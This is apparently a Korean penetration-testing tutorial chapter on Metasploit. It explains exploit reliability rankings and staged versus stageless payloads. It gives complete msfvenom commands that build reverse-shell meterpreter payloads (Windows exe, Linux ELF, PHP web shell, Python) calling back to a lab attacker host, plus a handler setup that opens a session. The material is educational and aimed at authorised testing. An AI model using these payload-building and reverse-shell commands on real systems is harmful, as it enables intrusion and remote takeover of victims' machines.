Chapter 04

Exploit & Payload 심층 이해

왜 익스플로잇과 페이로드를 분리하는가 — 작동 원리, staged vs stageless, msfvenom 실전 활용까지

🔬 익스플로잇이 동작하는 방식

익스플로잇(Exploit)은 소프트웨어의 버그나 설계 결함을 이용해 개발자가 의도하지 않은 동작을 유발하는 코드입니다. 자물쇠의 제조 결함을 이용해 열쇠 없이 문을 여는 것과 같습니다. 결함은 자물쇠(소프트웨어)에 있고, 익스플로잇은 그 결함을 찾아내서 이용하는 기술입니다.

Metasploit의 핵심 아이디어는 이 "문을 여는 기술"과, 문을 연 뒤에 "무엇을 할지"를 분리한 것입니다. 문을 여는 방법(익스플로잇)은 같아도, 들어가서 할 일(페이로드)은 상황마다 다릅니다. 이 분리 덕분에 수천 개의 취약점에 수백 가지 작업을 조합할 수 있게 됩니다.

익스플로잇 랭킹 이해하기

모든 익스플로잇에는 신뢰도 랭킹이 붙어 있습니다. 이것은 단순히 "성공률"이 아니라, 대상 시스템에 미치는 영향까지 포함한 종합 평가입니다.

랭크 의미 안정성
Excellent 시스템 충돌 없이 거의 항상 성공 매우 안전
Great 기본 설정 감지 + 자동 실행 안전
Good 일반 설정에서 동작, 충돌 위험 낮음 보통
Normal 신뢰할 수 있지만 특정 설정 필요 보통
Average 절반 정도 성공, 충돌 가능 주의
Low 낮은 성공률, 버전 특정적 위험
Manual 수동 개입 필수, DoS 가능 매우 위험
⚠️
Average 이하 랭크 사용 시 주의

Average, Low, Manual 랭크의 익스플로잇은 대상 시스템을 충돌(크래시)시킬 수 있습니다. 실제 운영 시스템에서는 서비스 중단이 발생할 수 있으므로, 반드시 테스트 환경에서만 사용하고 고객사와의 계약서에 이 위험성을 명시해야 합니다.

📦 Payload 심층 분석 — Staged vs Stageless

페이로드 선택은 익스플로잇 선택만큼 중요합니다. 특히 staged와 stageless의 차이를 이해하지 못하면 많은 상황에서 연결이 실패합니다.

🔗 Staged 페이로드 (슬래시 표기)

예: windows/meterpreter/reverse_tcp

두 단계로 작동합니다. 먼저 작은 stager 코드가 실행되어 공격자 서버에 연결하고, 그 다음 실제 기능이 담긴 stage를 다운로드합니다. 초기 페이로드 크기가 작아 크기 제한이 있는 상황에서 유리합니다.

⚡ 초기 크기 작음 | 인터넷 연결 필요 | Metasploit 핸들러 필수

🎁 Stageless 페이로드 (언더스코어 표기)

예: windows/meterpreter_reverse_tcp

모든 기능이 하나의 파일에 담겨 있습니다. 타깃이 인터넷에 접근할 수 없거나, 방화벽이 2단계 통신을 차단하는 경우에도 동작합니다. 파일 크기가 크지만 더 신뢰할 수 있습니다.

🛡️ 크기 큼 | 독립 동작 | 안티바이러스 탐지 높음

✅ 상황별 페이로드 선택 가이드 
# 내부 네트워크, MSF 핸들러 사용 가능 → Staged (권장)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 제한된 환경, 단일 파일 배포 → Stageless
set PAYLOAD windows/x64/meterpreter_reverse_tcp

# 리눅스 타깃
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# 페이로드 상세 정보 확인
msf6 > info payload/windows/x64/meterpreter/reverse_tcp

🔨 msfvenom — 독립 페이로드 생성기

msfconsole 밖에서도 페이로드를 생성해야 할 때가 있습니다. 예를 들어, 소셜 엔지니어링 시나리오에서 타깃이 실행할 파일을 만들거나, 웹 서버에 업로드할 악성 스크립트를 만들 때입니다. 이때 사용하는 도구가 msfvenom입니다.

🔨 msfvenom 실전 사용 예시 
# Windows 실행파일 (.exe) 페이로드 생성
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.100 \
  LPORT=4444 \
  -f exe \
  -o /tmp/payload.exe

# Linux ELF 바이너리
msfvenom \
  -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.100 LPORT=4444 \
  -f elf \
  -o /tmp/shell.elf

# PHP 웹셸 (웹 서버 타깃)
msfvenom \
  -p php/meterpreter/reverse_tcp \
  LHOST=192.168.56.100 LPORT=4444 \
  -f raw \
  -o /tmp/shell.php

# Python 페이로드
msfvenom \
  -p python/meterpreter/reverse_tcp \
  LHOST=192.168.56.100 LPORT=4444 \
  -f raw

# 지원 형식 목록 확인
msfvenom --list formats

# 지원 페이로드 목록 (필터)
msfvenom -l payloads | grep "windows/x64"

핸들러 설정 — 페이로드의 전화를 받는 법

msfvenom으로 만든 페이로드가 타깃에서 실행되면, 공격자 쪽에서 그 연결을 받아줄 핸들러가 필요합니다. 마치 상대방이 전화를 걸 때 받는 쪽에서도 전화기를 들고 있어야 하는 것과 같습니다.

🔨 리버스 연결 핸들러 설정 
msf6 > use exploit/multi/handler

msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.56.100
msf6 exploit(handler) > set LPORT 4444

# 백그라운드에서 핸들러 실행 (-j 옵션)
msf6 exploit(handler) > exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.56.100:4444

# 타깃에서 payload.exe 실행 후...
[*] Sending stage (200262 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened
